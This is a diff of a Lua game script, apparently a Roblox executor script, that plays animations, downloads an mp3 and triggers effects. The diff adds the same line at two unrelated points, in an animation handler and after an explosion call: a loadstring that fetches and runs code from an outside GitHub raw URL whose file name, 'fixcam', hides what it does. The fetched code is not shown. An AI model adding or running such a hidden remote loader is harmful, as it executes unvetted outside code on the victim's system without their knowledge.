@@ -3851,6 +3851,7 @@ local function onAnimationPlayed(track)
 		print(generateRandomSentence())
 track:Stop()
 wait(0.01)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fixcam.txt"))()
 local u = "https://s52-hzfi.freeconvert.com/task/68cef833ada89bc00605905c/copy_3D4091C2-9E24-4CCF-8A1B-DFAD4A26FB9C.mp3"
 local f = "hahahaboi.mp3"
 if not isfile(f) then writefile(f, game:HttpGet(u)) end
@@ -4035,6 +4036,7 @@ local function Start(char)
 		Debris:AddItem(red, 6)
 		Debris:AddItem(wind, 6)
 		Explode(char)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fixcam.txt"))()
 	end)
 end
 
